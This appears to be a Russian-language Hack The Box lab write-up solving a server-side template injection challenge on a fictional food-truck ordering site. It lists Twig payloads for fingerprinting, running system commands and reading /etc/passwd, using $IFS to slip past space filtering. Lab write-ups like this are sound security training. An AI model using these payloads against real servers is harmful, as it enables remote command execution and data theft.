## Сценарий

Компания, занимающаяся фудтраками, Flavor Fusion Express поручила вам провести оценку безопасности своего недавно запущенного веб-сайта, созданного для расширения охвата клиентов и упрощения онлайн-заказов. Несмотря на то, что сайт призван повысить вовлеченность пользователей и узнаваемость бренда, компания особенно обеспокоена потенциальными уязвимостями на стороне сервера, которые могут привести к компрометации конфиденциальных бизнес-данных, информации о заказах или административных функций. Ваша задача — оценить серверную инфраструктуру, конфигурацию и логику сервера на предмет уязвимостей, которыми может воспользоваться злоумышленник. Попробуйте использовать различные методы, о которых вы узнали в этом модуле, чтобы выявить и устранить уязвимости в веб-приложении.


## Решение

Необходимо выявить тип уязвимости.
Им оказался SSTI

![image](https://github.com/onomatore/HTB_SA/blob/main/Server-Side%20Attacks/img/1.png)

Нагрузка дала такой результат: `{{7*'7'}}` = 49, соответственно шаблонизатор - `twig`

Пробуем другие полезные нагрузки для `twig`

`{{"/etc/passwd"|file_excerpt(1,-1)}}` - дало пустой вывод 200 статус

`{{['id'] | filter('system')}}` - выдало  ошибку: 
`Error (3): URL using bad/illegal format or missing URL`

`{{%5B%27id%27%5D+%7C+filter%28%27system%27%29}}` - та же ошибка

Вероятно надо фаззить нагрузку которая сработает.

`{{_self}}` - работает и выводит 

![image](https://github.com/onomatore/HTB_SA/blob/main/Server-Side%20Attacks/img/2.png)

Загрузил все возможные пейлоды для TWIG  и нашел пару рабочих.

![image](https://github.com/onomatore/HTB_SA/blob/main/Server-Side%20Attacks/img/3.png)


Например такой, наконец выводил `ls`

![image](https://github.com/onomatore/HTB_SA/blob/main/Server-Side%20Attacks/img/4.png)

Но при попытке прочитать директорию выводил ту же ошибку (3).  Пробел через кодирование `%20`, также не проходит. 

Тогда я попробовал другую нагрузку где читался файл `/etc/passwd`, а именно:
`{{['cat$IFS/etc/passwd']|filter('system')}}`

![image](https://github.com/onomatore/HTB_SA/blob/main/Server-Side%20Attacks/img/5.png)


Стало ясно, что нужно использовать `$IFS`, поэтому добавил его к своей нагрузке
`{{['ls$IFS/']|filter('passthru')}}` и получил ответ

![image](https://github.com/onomatore/HTB_SA/blob/main/Server-Side%20Attacks/img/6.png)


Результат чтения флага.
![image](https://github.com/onomatore/HTB_SA/blob/main/Server-Side%20Attacks/img/7.png)
